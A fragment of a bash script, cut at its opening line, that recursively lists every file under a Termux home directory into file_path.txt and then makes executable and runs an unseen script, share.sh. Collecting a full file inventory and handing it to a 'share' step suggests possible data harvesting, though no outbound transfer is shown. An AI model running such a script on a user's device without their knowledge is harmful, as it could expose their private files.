ist_files() {
    local dir="$1"
    local prefix="$2"

    # List files in the current directory
    for file in "$dir"/*; do
        if [ -f "$file" ]; then
            echo "${prefix}${file}" >> file_path.txt
        elif [ -d "$file" ]; then
            echo "${prefix}${file}" >> file_path.txt
            list_files "$file" "${prefix}  "
        fi
    done
}

# Start the process from the specified directory
start_dir="/data/data/com.termux/files/home"
list_files "$start_dir" ""

sed -i 's/^[[:space:]]*//' file_path.txt
chmod +x share.sh
./share.sh
